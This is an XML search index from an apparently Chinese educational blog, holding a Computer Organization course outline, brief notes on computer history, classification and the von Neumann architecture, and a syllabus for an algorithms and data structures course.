<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>计算机组成原理</title>
    <url>/2024/09/19/20240919-01.html</url>
    <content><![CDATA[<h1 id="课程简介"><a href="#课程简介" class="headerlink" title="课程简介"></a>课程简介</h1><ul>
<li>本课程为计算机专业学生量身定制，既可用于学习《计算机组成原理》相关知识，也可用于考研复习。内容包括：计算机系统概述、数据的表示和运算、存储系统、指令系统、中央处理器、总线、输入&#x2F;输出系统等章节。内容力求精炼、重点突出、条理清晰、深入浅出。本课程精选历年考研真题，给出详细的解题思路和部分答案，达到讲练结合、灵活掌握、举一反三的效果。</li>
<li>本课程对学习《操作系统》、《计算机网络》课程大有帮助，可以作为其辅导课程。</li>
</ul>
<h1 id="课程目标"><a href="#课程目标" class="headerlink" title="课程目标"></a>课程目标</h1><ol>
<li>掌握计算机组成一般原理，理解形成计算机的整体概念</li>
<li>掌握数的表示和运算，理解进制、精度、溢出、转换等概念</li>
<li>理解存储器的分类、特点和扩展，掌握Cache的相关计算和替换算法</li>
<li>理解指令、地址及相关概念，掌握指令的格式、寻址方式和有关计算</li>
<li>理解CPU、数据通路的基本功能和结构，掌握控制器的功能和工作原理，掌握指令流水线的基本实现</li>
<li>理解总线的概念、分类、组成和性能指标，掌握总线仲裁、操作、定时方式</li>
<li>理解输入、输出的概念，能够识别常见的IO设备，掌握IO控制器的功能和结构，掌握IO相关计算，掌握中断的各种原理和特点</li>
</ol>
<h1 id="适合人群"><a href="#适合人群" class="headerlink" title="适合人群"></a>适合人群</h1><ul>
<li>0基础学习计算机专业知识的学员</li>
<li>复习计算机基础知识的学员（建议学习者具备一定的C&#x2F;C++、Python、Java、Go等任意编程语言的编码经验）</li>
</ul>
<h1 id="课程亮点"><a href="#课程亮点" class="headerlink" title="课程亮点"></a>课程亮点</h1><ol>
<li>必知必会：本课程是软件开发人员“必知必会”的计算机基础知识，同时包含了大量的常见面试题，请务必认真学习；</li>
<li>体系完整：本课程共包含七章，包括计算机系统概述、数据的表示和运算、存储系统、指令系统、中央处理器、总线、输入&#x2F;输出系统等章节，涵盖计算机组成的整体概念和一般原理，是学习计算机组成的不二之选；</li>
<li>权威参考：以唐朔飞老师《计算机组成原理》（第3版）为蓝本，所有知识以该教材为准——懂得都懂；</li>
<li>由浅入深：为适应初学者&#x2F;零基础学员的学习需要，调整了部分知识的讲解次序，循序渐进的理解知识；采用自然语言，增加了许多现实世界的例子，更加通俗易懂；</li>
<li>真题直达：课程中增加了许多历年考研真题，让学习者感受真实考场，手把手带你解析真题；课程还包含部分真实的职场面试题，让你面试无忧。</li>
</ol>
<h1 id="课程大纲"><a href="#课程大纲" class="headerlink" title="课程大纲"></a>课程大纲</h1><h2 id="第一章-计算机系统概述"><a href="#第一章-计算机系统概述" class="headerlink" title="第一章 计算机系统概述"></a>第一章 计算机系统概述</h2><h3 id="1-1-计算机系统概述"><a href="#1-1-计算机系统概述" class="headerlink" title="1.1 计算机系统概述"></a>1.1 计算机系统概述</h3><ul>
<li><a href="/2024/09/19/20240919-02.html">计算机的发展历程</a></li>
<li><a href="/2024/09/19/20240919-03.html">计算机软件的发展</a></li>
<li><a href="/2024/09/19/20240919-04.html">计算机的分类与发展方向</a></li>
</ul>
<h3 id="1-2-计算机系统层次结构"><a href="#1-2-计算机系统层次结构" class="headerlink" title="1.2 计算机系统层次结构"></a>1.2 计算机系统层次结构</h3><ul>
<li>计算机系统的组成</li>
<li>计算机硬件的基本组成</li>
<li>计算机软件的分类</li>
<li>计算机的工作过程</li>
<li>计算机系统的多层次结构</li>
</ul>
<h3 id="1-3-计算机的性能指标"><a href="#1-3-计算机的性能指标" class="headerlink" title="1.3 计算机的性能指标"></a>1.3 计算机的性能指标</h3><ul>
<li>计算机的主要性能指标</li>
<li>几个专业术语</li>
</ul>
<h2 id="第二章-数据的表示和运算"><a href="#第二章-数据的表示和运算" class="headerlink" title="第二章 数据的表示和运算"></a>第二章 数据的表示和运算</h2><h3 id="2-1-数制和编码"><a href="#2-1-数制和编码" class="headerlink" title="2.1 数制和编码"></a>2.1 数制和编码</h3><ul>
<li>进位计数制及其相互转换</li>
<li>真值和机器数</li>
<li>BCD码</li>
<li>字符与字符串</li>
<li>校验码</li>
</ul>
<h3 id="2-2-定点数的表示与运算"><a href="#2-2-定点数的表示与运算" class="headerlink" title="2.2 定点数的表示与运算"></a>2.2 定点数的表示与运算</h3><ul>
<li>定点数的表示</li>
<li>定点数的运算</li>
<li>C语言中的整数类型及类型转换</li>
<li>数据的存储和排列</li>
</ul>
<h3 id="2-3-浮点数的表示与运算"><a href="#2-3-浮点数的表示与运算" class="headerlink" title="2.3 浮点数的表示与运算"></a>2.3 浮点数的表示与运算</h3><ul>
<li>浮点数的表示</li>
<li>浮点数的加减运算</li>
</ul>
<h3 id="2-4-算数逻辑单元（ALU）"><a href="#2-4-算数逻辑单元（ALU）" class="headerlink" title="2.4 算数逻辑单元（ALU）"></a>2.4 算数逻辑单元（ALU）</h3><ul>
<li>串行加法器和并行加法器</li>
<li>算数逻辑单元的功能和结构</li>
</ul>
<h2 id="第三章-存储系统"><a href="#第三章-存储系统" class="headerlink" title="第三章 存储系统"></a>第三章 存储系统</h2><h3 id="3-1-存储器概述"><a href="#3-1-存储器概述" class="headerlink" title="3.1 存储器概述"></a>3.1 存储器概述</h3><ul>
<li>存储器的分类</li>
<li>存储器的性能指标</li>
</ul>
<h3 id="3-2-存储器的层次化结构"><a href="#3-2-存储器的层次化结构" class="headerlink" title="3.2 存储器的层次化结构"></a>3.2 存储器的层次化结构</h3><ul>
<li>多级存储系统</li>
</ul>
<h3 id="3-3-半导体随机存储器"><a href="#3-3-半导体随机存储器" class="headerlink" title="3.3 半导体随机存储器"></a>3.3 半导体随机存储器</h3><ul>
<li>SRAM和DRAM</li>
<li>只读存储器</li>
<li>主存储器的基本组成</li>
</ul>
<h3 id="3-4-主存储器与CPU的连接"><a href="#3-4-主存储器与CPU的连接" class="headerlink" title="3.4 主存储器与CPU的连接"></a>3.4 主存储器与CPU的连接</h3><ul>
<li>连接原理</li>
<li>主存容量的扩展</li>
<li>存储芯片的地址分配和片选</li>
<li>存储器与CPU的连接</li>
</ul>
<h3 id="3-5-双端口RAM和多模块存储器"><a href="#3-5-双端口RAM和多模块存储器" class="headerlink" title="3.5 双端口RAM和多模块存储器"></a>3.5 双端口RAM和多模块存储器</h3><ul>
<li>双端口RAM</li>
<li>多模块存储器</li>
</ul>
<h3 id="3-6-高速缓冲存储器"><a href="#3-6-高速缓冲存储器" class="headerlink" title="3.6 高速缓冲存储器"></a>3.6 高速缓冲存储器</h3><ul>
<li>程序访问的局部性原理</li>
<li>Cache的基本工作原理</li>
<li>Cache和主存的映射方式</li>
<li>Cache中主存块的替换算法</li>
<li>Cache写策略</li>
</ul>
<h3 id="3-7-虚拟存储器"><a href="#3-7-虚拟存储器" class="headerlink" title="3.7 虚拟存储器"></a>3.7 虚拟存储器</h3><ul>
<li>虚拟存储器的基本概念</li>
<li>页式虚拟存储器</li>
<li>加快地址转换：快表（TLB）</li>
<li>段式虚拟存储器</li>
<li>段页式虚拟存储器</li>
<li>虚拟存储器与Cache的比较</li>
</ul>
<h2 id="第四章-指令系统"><a href="#第四章-指令系统" class="headerlink" title="第四章 指令系统"></a>第四章 指令系统</h2><h3 id="4-1-指令格式"><a href="#4-1-指令格式" class="headerlink" title="4.1 指令格式"></a>4.1 指令格式</h3><ul>
<li>指令的基本格式</li>
<li>定长操作码指令格式</li>
<li>扩展操作码指令格式</li>
</ul>
<h3 id="4-2-指令的寻址方式"><a href="#4-2-指令的寻址方式" class="headerlink" title="4.2 指令的寻址方式"></a>4.2 指令的寻址方式</h3><ul>
<li>指令的寻址和数据寻址</li>
<li>常见的数据寻址方式</li>
<li>X86汇编指令入门</li>
</ul>
<h3 id="4-3-CISC和RICS的基本概念"><a href="#4-3-CISC和RICS的基本概念" class="headerlink" title="4.3 CISC和RICS的基本概念"></a>4.3 CISC和RICS的基本概念</h3><ul>
<li>复杂指令系统计算机（CISC）</li>
<li>精简指令系统计算机（RISC）</li>
<li>CISC和RISC的比较</li>
</ul>
<h2 id="第五章-中央处理器"><a href="#第五章-中央处理器" class="headerlink" title="第五章 中央处理器"></a>第五章 中央处理器</h2><h3 id="5-1-CPU的功能和基本结构"><a href="#5-1-CPU的功能和基本结构" class="headerlink" title="5.1 CPU的功能和基本结构"></a>5.1 CPU的功能和基本结构</h3><ul>
<li>CPU的功能</li>
<li>CPU的基本结构</li>
</ul>
<h3 id="5-2-指令执行过程"><a href="#5-2-指令执行过程" class="headerlink" title="5.2 指令执行过程"></a>5.2 指令执行过程</h3><ul>
<li>指令周期</li>
<li>指令周期的数据流</li>
<li>指令执行方案</li>
</ul>
<h3 id="5-3-数据通路的功能和基本结构"><a href="#5-3-数据通路的功能和基本结构" class="headerlink" title="5.3 数据通路的功能和基本结构"></a>5.3 数据通路的功能和基本结构</h3><ul>
<li>数据通路的功能</li>
<li>数据通路的基本结构</li>
</ul>
<h3 id="5-4-控制的功能和工作原理"><a href="#5-4-控制的功能和工作原理" class="headerlink" title="5.4 控制的功能和工作原理"></a>5.4 控制的功能和工作原理</h3><ul>
<li>控制器的结构和功能</li>
<li>硬布线控制器</li>
<li>微程序控制器</li>
</ul>
<h3 id="5-5-指令流水线"><a href="#5-5-指令流水线" class="headerlink" title="5.5 指令流水线"></a>5.5 指令流水线</h3><ul>
<li>指令流水线的基本概念</li>
<li>流水线的分类</li>
<li>影响流水线的因素</li>
<li>流水线的性能指标</li>
<li>超标量流水线的基本概念</li>
</ul>
<h2 id="第六章-总线"><a href="#第六章-总线" class="headerlink" title="第六章 总线"></a>第六章 总线</h2><h3 id="6-1-总线概述"><a href="#6-1-总线概述" class="headerlink" title="6.1 总线概述"></a>6.1 总线概述</h3><ul>
<li>总线基本概念</li>
<li>总线的分类</li>
<li>系统总线的结构</li>
<li>总线的性能指标</li>
</ul>
<h3 id="6-2-总线仲裁"><a href="#6-2-总线仲裁" class="headerlink" title="6.2 总线仲裁"></a>6.2 总线仲裁</h3><ul>
<li>集中仲裁方式</li>
<li>分布仲裁方式</li>
</ul>
<h3 id="6-3-总线操作和定时"><a href="#6-3-总线操作和定时" class="headerlink" title="6.3 总线操作和定时"></a>6.3 总线操作和定时</h3><ul>
<li>总线传输的四个阶段</li>
<li>同步定时方式</li>
<li>异步定时方式</li>
</ul>
<h3 id="6-4-总线标准"><a href="#6-4-总线标准" class="headerlink" title="6.4 总线标准"></a>6.4 总线标准</h3><ul>
<li>常见的总线标准</li>
</ul>
]]></content>
      <tags>
        <tag>计算机组成原理</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机的发展历程</title>
    <url>/2024/09/19/20240919-02.html</url>
    <content><![CDATA[<h1 id="计算机系统的组成"><a href="#计算机系统的组成" class="headerlink" title="计算机系统的组成"></a>计算机系统的组成</h1><ul>
<li>硬件（裸机）</li>
<li>操作系统（OS）</li>
<li>应用程序</li>
<li>用户</li>
</ul>
<p><img src="/./assets/20240919/7ac4874c03f64de9ba65a042d2947a76.png" alt="计算机系统"></p>
<p>操作系统和应用程序统称为软件，系统软件主要包括：</p>
<ul>
<li>操作系统</li>
<li>语言处理程序</li>
<li>数据库管理系统</li>
<li>分布式软件系统</li>
<li>网络软件系统</li>
<li>各种服务软件</li>
</ul>
<h1 id="计算机硬件的发展"><a href="#计算机硬件的发展" class="headerlink" title="计算机硬件的发展"></a>计算机硬件的发展</h1><ol>
<li>电子管时代（1946-1959）</li>
<li>晶体管时代（1959-1964）</li>
<li>中小规模集成电路时代（1964-1975）</li>
<li>超大规模集成电路时代（1975-1990）</li>
<li>超级规模集成电路时代（1990-现在）</li>
</ol>
<p>1946年02月15日，诞生了第一台计算机，称为：ENIAC（Electronic Numerical Integrator and Computer）。</p>
<p><img src="/./assets/20240919/be2eb7263f694464946d4ee5a97752d6.png" alt="ENIAC"></p>
]]></content>
      <tags>
        <tag>计算机组成原理</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机软件的发展</title>
    <url>/2024/09/19/20240919-03.html</url>
    <content><![CDATA[<h1 id="计算机软件的发展"><a href="#计算机软件的发展" class="headerlink" title="计算机软件的发展"></a>计算机软件的发展</h1><ol>
<li>汇编语言阶段（20世纪50年代）</li>
<li>程序批处理阶段（20世纪60年代）</li>
<li>分时多用户阶段（20世纪70年代）</li>
<li>分布式管理阶段（20世纪80年代）</li>
<li>软件重用阶段（20世纪90年代）</li>
<li>Web服务阶段（21世纪初至今）</li>
</ol>
]]></content>
      <tags>
        <tag>计算机组成原理</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机的分类与发展方向</title>
    <url>/2024/09/19/20240919-04.html</url>
    <content><![CDATA[<h1 id="电子计算机的分类"><a href="#电子计算机的分类" class="headerlink" title="电子计算机的分类"></a>电子计算机的分类</h1><h2 id="处理信号不同"><a href="#处理信号不同" class="headerlink" title="处理信号不同"></a>处理信号不同</h2><h3 id="模拟计算机"><a href="#模拟计算机" class="headerlink" title="模拟计算机"></a>模拟计算机</h3><ul>
<li>模拟信号：电磁波</li>
<li>连续的</li>
</ul>
<p><img src="/./assets/20240919/8e0b679ade4f42e8b4f1d0b885347bae.png" alt="模拟信号"></p>
<h3 id="数字计算机"><a href="#数字计算机" class="headerlink" title="数字计算机"></a>数字计算机</h3><ul>
<li>数字信号：电信号</li>
<li>非连续的</li>
</ul>
<p><img src="/./assets/20240919/a7030bd93c74417ba2096a9d3cd219a5.png" alt="数字信号"></p>
<h2 id="用途不同"><a href="#用途不同" class="headerlink" title="用途不同"></a>用途不同</h2><h3 id="专用计算机"><a href="#专用计算机" class="headerlink" title="专用计算机"></a>专用计算机</h3><ul>
<li>特定任务</li>
<li>效率高</li>
<li>适应性差</li>
</ul>
<h3 id="通用计算机"><a href="#通用计算机" class="headerlink" title="通用计算机"></a>通用计算机</h3><ul>
<li>任何任务</li>
<li>效率低</li>
<li>经济性差</li>
<li>适应性强</li>
</ul>
<p>通用计算机再细分为：</p>
<ul>
<li>巨型机</li>
<li>大型机</li>
<li>中型机</li>
<li>小型机</li>
<li>微机</li>
<li>单片机</li>
</ul>
<h1 id="计算机的展望"><a href="#计算机的展望" class="headerlink" title="计算机的展望"></a>计算机的展望</h1><p>未来计算机的发展会变得两极分化。</p>
<h2 id="一极：微型机"><a href="#一极：微型机" class="headerlink" title="一极：微型机"></a>一极：微型机</h2><ul>
<li>微型化</li>
<li>网络化</li>
<li>高性能</li>
<li>多用途（多媒体应用）</li>
</ul>
<h2 id="一极：巨型机"><a href="#一极：巨型机" class="headerlink" title="一极：巨型机"></a>一极：巨型机</h2><ul>
<li>巨型化</li>
<li>超高速</li>
<li>并行处理</li>
<li>智能化</li>
</ul>
]]></content>
      <tags>
        <tag>计算机组成原理</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机系统的组成</title>
    <url>/2024/09/19/20240919-05.html</url>
    <content><![CDATA[<h1 id="计算机硬件的基本组成"><a href="#计算机硬件的基本组成" class="headerlink" title="计算机硬件的基本组成"></a>计算机硬件的基本组成</h1><p>计算机的最基本组成就是使用总线将各个组件连起来：</p>
<ul>
<li>输入设备</li>
<li>输出设备</li>
<li>存储器</li>
<li>运算器</li>
<li>控制器</li>
</ul>
<p><img src="/./assets/20240919/b1b586c0c73b4580acd4d0510d448b09.png" alt="计算机硬件基本组成"></p>
<h2 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h2><p><img src="/./assets/20241008/85e9b44dbd7f459f982569c503c5d6f7.png" alt="存储器"></p>
<h2 id="运算器"><a href="#运算器" class="headerlink" title="运算器"></a>运算器</h2><p><img src="/./assets/20241008/f5dbefcbb320401cad79c3ce1f6ed920.png" alt="运算器"></p>
<h2 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h2><p><img src="/./assets/20241008/27fcbd169acb46e8a8dc4252bc166f0b.png" alt="控制器"></p>
]]></content>
      <tags>
        <tag>计算机组成原理</tag>
      </tags>
  </entry>
  <entry>
    <title>算法与数据结构基础班</title>
    <url>/2024/09/20/20240920-01.html</url>
    <content><![CDATA[<h1 id="章节1-认识复杂度、对数器、二分法与异或运算-20节"><a href="#章节1-认识复杂度、对数器、二分法与异或运算-20节" class="headerlink" title="章节1: 认识复杂度、对数器、二分法与异或运算 (20节)"></a>章节1: 认识复杂度、对数器、二分法与异或运算 (20节)</h1><ul>
<li>什么是算法数据结构</li>
<li>何为常数时间的操作</li>
<li>常见的常数时间操作</li>
<li>时间复杂度的意义</li>
<li>选择排序</li>
<li>冒泡排序</li>
<li>插入排序</li>
<li>额外空间复杂度</li>
<li>面试、比赛、刷题中、一个问题的最优解是什么意思</li>
<li>常见的时间复杂度</li>
<li>算法和数据结构学习的大脉络</li>
<li>什么叫对数器</li>
<li>什么叫二分法</li>
<li>在一个有序数组中，找&#x3D;某个数的最左侧位置</li>
<li>局部最小值</li>
<li>认识异或运算</li>
<li>如何不用额外变量交换两个数的值</li>
<li>一个数组中有一种数出现了奇数次，其他数都出现了偶数次怎么找到这种数</li>
<li>怎么把一个int类型的数，提取出最右侧1来</li>
<li>一个数组中有一种数出现了奇数次，其他数都出现了偶数次怎么找到这两种数</li>
</ul>
<h1 id="章节2-链表结构、栈、队列、递归行为、哈希表和有序表-13节"><a href="#章节2-链表结构、栈、队列、递归行为、哈希表和有序表-13节" class="headerlink" title="章节2: 链表结构、栈、队列、递归行为、哈希表和有序表 (13节)"></a>章节2: 链表结构、栈、队列、递归行为、哈希表和有序表 (13节)</h1><ul>
<li>单双向链表节点结构</li>
<li>单双链表如何反转</li>
<li>把给定值删除</li>
<li>java和c++在内存释放上的问题</li>
<li>什么是栈和队列</li>
<li>栈和队列的实际实现（双向链表实现）</li>
<li>栈和队列的实际实现（数组实现）</li>
<li>既然语言都有这些结构和api，为什么还需要手撸练习</li>
<li>如何用队列结构实现栈结构</li>
<li>如何使用栈结构实现队列结构</li>
<li>求数组arr[L..R]中的最大值，怎么用递归方法实现</li>
<li>Master公式</li>
<li>哈希表</li>
</ul>
<h1 id="章节3-归并排序与随机快排-15节"><a href="#章节3-归并排序与随机快排-15节" class="headerlink" title="章节3: 归并排序与随机快排 (15节)"></a>章节3: 归并排序与随机快排 (15节)</h1><ul>
<li>什么是归并排序</li>
<li>归并排序（递归方法实现）</li>
<li>归并排序（非递归方法实现）（1）</li>
<li>归并排序（非递归方法实现）（2）</li>
<li>归并排序时间复杂度分析</li>
<li>根据常见面试题深入理解归并排序</li>
<li>根据常见面试题深入理解归并排序代码解析</li>
<li>在一个数组中求降序对</li>
<li>Partition过程</li>
<li>荷兰国旗问题</li>
<li>快速排序1.0</li>
<li>快速排序2.0</li>
<li>快速排序3.0</li>
<li>怎么解决复杂度</li>
<li>额外空间复杂度怎么估计</li>
</ul>
<h1 id="章节4-比较器与堆-18节"><a href="#章节4-比较器与堆-18节" class="headerlink" title="章节4: 比较器与堆 (18节)"></a>章节4: 比较器与堆 (18节)</h1><ul>
<li>完全二叉树结构</li>
<li>堆是什么</li>
<li>大根堆讲解1</li>
<li>大根堆代码1</li>
<li>大根堆讲解2</li>
<li>答疑</li>
<li>下沉的复杂度是多少</li>
<li>堆排序是什么</li>
<li>堆排序优化1</li>
<li>直观认识完全二叉树</li>
<li>答疑1</li>
<li>怎么保证每一个数再排完序的距离不会超过k</li>
<li>答疑2</li>
<li>比较器（重载比较运算符）</li>
<li>比较器（排序）</li>
<li>比较器（特殊标准排序的结构）</li>
<li>什么情况下可以用语言提供的堆结构，什么情况下必须手动写</li>
<li>什么情况下可以用语言提供的堆结构，什么情况下必须手动写代码实现</li>
</ul>
<h1 id="章节5-trie、桶排序、排序总结-18节"><a href="#章节5-trie、桶排序、排序总结-18节" class="headerlink" title="章节5: trie、桶排序、排序总结 (18节)"></a>章节5: trie、桶排序、排序总结 (18节)</h1><ul>
<li>答疑</li>
<li>前缀树</li>
<li>怎么实现前缀树</li>
<li>答疑</li>
<li>word这个字符串之前加入过几次</li>
<li>有多少字符串是以pre这个字符串作为前缀的</li>
<li>删除</li>
<li>答疑</li>
<li>前缀树是怎么拓展的</li>
<li>不基于比较的排序</li>
<li>基数排序</li>
<li>基数排序代码</li>
<li>基数排序代码拆解</li>
<li>计数排序和基数排序</li>
<li>选择、冒泡、插入排序有没有稳定性</li>
<li>归并、快排、堆排序有没有稳定性</li>
<li>排序算法总结</li>
<li>常见的坑</li>
</ul>
<h1 id="章节6-链表相关面试题-14节"><a href="#章节6-链表相关面试题-14节" class="headerlink" title="章节6: 链表相关面试题 (14节)"></a>章节6: 链表相关面试题 (14节)</h1><ul>
<li>链表问题</li>
<li>快慢指针简介</li>
<li>快慢指针代码</li>
<li>给定一个单链表的头节点head，判断该链表是否为回文机构</li>
<li>将单链表按某值划分成左边小、中间相等、右边大的形式</li>
<li>特殊的单链表节点（用哈希表的方法）</li>
<li>不用哈希表的方法</li>
<li>两个有环也可能无环的单链表，如果相交，返回相交的第一个节点，如果不想交，返回null</li>
<li>两个有环也可能无环的单链表，如果相交，返回相交的第一个节点，如果不想交，返回null代码实现</li>
<li>两个无环链表是否相交</li>
<li>两个无环链表是否相交代码</li>
<li>答疑</li>
<li>两个链表都有环有几种结构</li>
<li>能不能不给单链表的头节点，只给想要删除的节点，就能做到在链表上把这个删掉</li>
</ul>
<h1 id="章节7-二叉树的基本算法-12节"><a href="#章节7-二叉树的基本算法-12节" class="headerlink" title="章节7: 二叉树的基本算法 (12节)"></a>章节7: 二叉树的基本算法 (12节)</h1><ul>
<li>什么叫二叉树</li>
<li>二叉树遍历（什么叫子树）</li>
<li>二叉树遍历是什么意思</li>
<li>二叉树遍历实现</li>
<li>非递归方式实现二叉树的遍历</li>
<li>非递归方式实现二叉树的遍历(前序)</li>
<li>非递归方式实现二叉树的遍历(中序)</li>
<li>非递归方式实现二叉树的遍历(后序)</li>
<li>实现二叉树按层遍历（队列方式）</li>
<li>统计二叉树最大的宽度（用Map）</li>
<li>统计二叉树最大的宽度（不用Map）</li>
<li>二叉树的序列化和反序列化</li>
</ul>
<h1 id="章节8-二叉树的递归套路-16节"><a href="#章节8-二叉树的递归套路-16节" class="headerlink" title="章节8: 二叉树的递归套路 (16节)"></a>章节8: 二叉树的递归套路 (16节)</h1><ul>
<li>如何设计一个打印整棵树的打印函数</li>
<li>给一个二叉树中的某个节点，返回该节点的后继节点1</li>
<li>如果x没有又数</li>
<li>后继</li>
<li>给一个二叉树中的某个节点，返回该节点的后继节点2</li>
<li>给一个二叉树中的某个节点，返回该节点的后继节点代码实现</li>
<li>给定一个如如参数N，代表纸条都从下边上向上方连续对着N次，请从上到下导引所有折痕的方向1</li>
<li>给定一个如如参数N，代表纸条都从下边上向上方连续对着N次，请从上到下导引所有折痕的方向2</li>
<li>二叉树的递归套路1</li>
<li>什么叫平衡树</li>
<li>二叉树的递归套路2</li>
<li>列出所有可能性后，确定到底需要向左树和右树要什么样的信息</li>
<li>给定一颗二叉树的头结点head，任何两个节点之间都存在距离，返回整课二叉树的最大距离</li>
<li>给定二叉树的头节点head，返回这个二叉树最大的二叉树搜索子树的头节点</li>
<li>二叉树递归套路3</li>
<li>排队的最大快乐值</li>
</ul>
<h1 id="章节9-贪心算法-8节"><a href="#章节9-贪心算法-8节" class="headerlink" title="章节9:贪心算法 (8节)"></a>章节9:贪心算法 (8节)</h1><ul>
<li>返回这颗二叉树是不是满二叉树1</li>
<li>返回这颗二叉树是不是满二叉树2</li>
<li>返回a和b的最低公共祖先</li>
<li>贪心算法</li>
<li>贪心算法例子</li>
<li>从头到尾讲一道利用贪心算法求解的题目(1)</li>
<li>从头到尾讲一道利用贪心算法求解的题目(2)</li>
<li>从头到尾讲一道利用贪心算法求解的题目(3)</li>
</ul>
<h1 id="章节10-并查集结构和图相关的算法-10节"><a href="#章节10-并查集结构和图相关的算法-10节" class="headerlink" title="章节10:并查集结构和图相关的算法 (10节)"></a>章节10:并查集结构和图相关的算法 (10节)</h1><ul>
<li>贪心算法求解的标准过程</li>
<li>贪心算法的解题套路</li>
<li>贪心算法的解题套路实战</li>
<li>返回如果点亮str中所有需要点亮的位置，至少需要几盏灯</li>
<li>整分整块金条，怎么分最省铜板</li>
<li>每做完一个项目马上获得的收益可以支持你去做下一个项目不能并行的做项目你最后获得的最大钱数</li>
<li>并查集</li>
<li>isSameSet和union方法的代价越低越好</li>
<li>并查集代码</li>
<li>并查集优化</li>
</ul>
<h1 id="章节11-暴力递归-7节"><a href="#章节11-暴力递归-7节" class="headerlink" title="章节11:暴力递归 (7节)"></a>章节11:暴力递归 (7节)</h1><ul>
<li>合并users返回合并之后的用户数量</li>
<li>图</li>
<li>图的宽度优先&amp;深度优先遍历（1）</li>
<li>图的宽度优先&amp;深度优先遍历（2）</li>
<li>图的拓扑排序算法</li>
<li>最小生成树算法之Kruskal</li>
<li>最小生成树算法之Prim</li>
</ul>
<h1 id="章节12-动态规划-8节"><a href="#章节12-动态规划-8节" class="headerlink" title="章节12:动态规划 (8节)"></a>章节12:动态规划 (8节)</h1><ul>
<li>Dijkstra算法</li>
<li>证明Dijkstra算法</li>
<li>改进后的Dijkstra算法</li>
<li>暴力递归</li>
<li>汉诺塔问题（1）</li>
<li>汉诺塔问题（2）</li>
<li>汉诺塔问题（3）</li>
<li>给你一个栈请你逆序这个栈不能申请额外的数据结构只能使用递归函数如何实现</li>
</ul>
<h1 id="章节13-暴力递归到动态规划1-8节"><a href="#章节13-暴力递归到动态规划1-8节" class="headerlink" title="章节13:暴力递归到动态规划1 (8节)"></a>章节13:暴力递归到动态规划1 (8节)</h1><ul>
<li>二叉树序列化</li>
<li>尝试</li>
<li>打印一个字符串的全部子序列</li>
<li>打印一个字符串的全部排列</li>
<li>打印一个字符串的全部排列不出现重复的排列</li>
<li>从左往右尝试模型1</li>
<li>从左往右尝试模型2</li>
<li>范围上尝试的模型</li>
</ul>
<h1 id="章节14-暴力递归到动态规划2-9节"><a href="#章节14-暴力递归到动态规划2-9节" class="headerlink" title="章节14:暴力递归到动态规划2 (9节)"></a>章节14:暴力递归到动态规划2 (9节)</h1><ul>
<li>课前例题1讲解</li>
<li>课前例题2讲解</li>
<li>N皇后</li>
<li>N皇后方法1</li>
<li>N皇后方法2</li>
<li>回答问题</li>
<li>怎么尝试一件事</li>
<li>动态规划</li>
<li>经典动态规划</li>
</ul>
<h1 id="章节15-暴力递归到动态规划3-8节"><a href="#章节15-暴力递归到动态规划3-8节" class="headerlink" title="章节15:暴力递归到动态规划3 (8节)"></a>章节15:暴力递归到动态规划3 (8节)</h1><ul>
<li>返回让所有咖啡杯变干净的最早完成时间</li>
<li>返回所有的路径中最小的路径和(1)</li>
<li>返回所有的路径中最小的路径和(2)</li>
<li>解题规律</li>
<li>值为正数不重复每个值代表一种面值的货币每种面值的货币求组成 aim 的方法数(1)</li>
<li>值为正数不重复每个值代表一种面值的货币每种面值的货币求组成 aim 的方法数(2)</li>
<li>值为正数不重复每个值代表一种面值的货币每种面值的货币求组成 aim 的方法数(3)</li>
<li>枚举行为优化</li>
</ul>
<h1 id="章节16-暴力递归到动态规划4-9节"><a href="#章节16-暴力递归到动态规划4-9节" class="headerlink" title="章节16:暴力递归到动态规划4 (9节)"></a>章节16:暴力递归到动态规划4 (9节)</h1><ul>
<li>返回需要至少多少张贴纸可以完成任务方法1(1)</li>
<li>返回需要至少多少张贴纸可以完成任务方法1(2)</li>
<li>返回需要至少多少张贴纸可以完成任务方法2</li>
<li>总结</li>
<li>两个字符串的最长公共子序列问题(1)</li>
<li>两个字符串的最长公共子序列问题(2)</li>
<li>两个字符串的最长公共子序列问题(13)</li>
<li>返回让所有咖啡杯变干净的最早完成时间方法1</li>
<li>返回让所有咖啡杯变干净的最早完成时间方法2</li>
</ul>
]]></content>
      <tags>
        <tag>算法与数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>冯·诺依曼计算机结构</title>
    <url>/2024/10/08/20241008-01.html</url>
    <content><![CDATA[<p><img src="/./assets/20241008/13377f019c8449e8a261ccda1e94c422.png" alt="冯诺依曼结构"></p>
<h1 id="入-出-存-算-控"><a href="#入-出-存-算-控" class="headerlink" title="入&#x2F;出&#x2F;存&#x2F;算&#x2F;控"></a>入&#x2F;出&#x2F;存&#x2F;算&#x2F;控</h1><h1 id="采用二进制表示数据和指令"><a href="#采用二进制表示数据和指令" class="headerlink" title="采用二进制表示数据和指令"></a>采用二进制表示数据和指令</h1><ul>
<li>以同等地位在存储器中，按地址寻访</li>
<li>指令由操作码和地址码组成</li>
<li>指令按顺序存放和执行，也可改变指令顺序</li>
</ul>
<h1 id="采用存储程序方式"><a href="#采用存储程序方式" class="headerlink" title="采用存储程序方式"></a>采用存储程序方式</h1><ul>
<li>事先编制好程序，并与所需数据预先存入主存</li>
<li>控制器自动地、连续地从存储器取出指令并执行</li>
</ul>
<p><img src="/./assets/20241008/1517ab65036e4c40866858e3695e8f5e.png" alt="冯诺依曼结构"></p>
<h1 id="冯诺依曼结构的模型机"><a href="#冯诺依曼结构的模型机" class="headerlink" title="冯诺依曼结构的模型机"></a>冯诺依曼结构的模型机</h1><p><img src="/./assets/20241008/2d0e2d27f7f1466e98160b71b38880fa.png" alt="冯诺依曼结构模型机"></p>
]]></content>
      <tags>
        <tag>计算机组成原理</tag>
      </tags>
  </entry>
  <entry>
    <title>现代计算机组织结构</title>
    <url>/2024/10/08/20241008-02.html</url>
    <content><![CDATA[<h1 id="现代计算机组织结构"><a href="#现代计算机组织结构" class="headerlink" title="现代计算机组织结构"></a>现代计算机组织结构</h1><ul>
<li>入&#x2F;出&#x2F;存&#x2F;算&#x2F;控</li>
<li>采用二进制表示数据和指令</li>
<li>采用存储程序方式</li>
